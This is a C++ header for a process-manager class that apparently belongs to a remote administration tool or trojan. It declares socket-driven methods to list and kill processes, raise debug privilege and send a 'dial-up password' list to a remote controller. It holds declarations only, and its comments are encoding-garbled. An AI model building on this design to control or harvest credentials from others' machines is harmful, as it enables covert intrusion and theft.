// CProcessManager.h: interface for the CProcessManager class.
//
//////////////////////////////////////////////////////////////////////

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
class CProcessManager : public CManager
{
	public:
		CProcessManager(CClientSocket* pClient, BYTE bHow);//bHow�Ǵ��������ܵı�־
		virtual ~CProcessManager();
		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

		//��Ȩ
		static bool DebugPrivilege(const char* PName, BOOL bEnable);
	private:
		BYTE m_caseSystemIs;//���캯�����ʼ������������������ֽ��̻��ߴ��ڵı���

		//��ȡ���̵�����·��
		BOOL GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH]);
		BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);

		//�������̣���ȡ���̵�����д��������ڴ�ռ�
		LPBYTE getProcessList();
		//���ͻ�ȡ�Ľ������ݵ����Ʒ����
		void SendProcessList();;
		void SendDialupassList();

		//����pid��ɱ������
		void KillProcess(LPBYTE lpBuffer, UINT nSize);


};

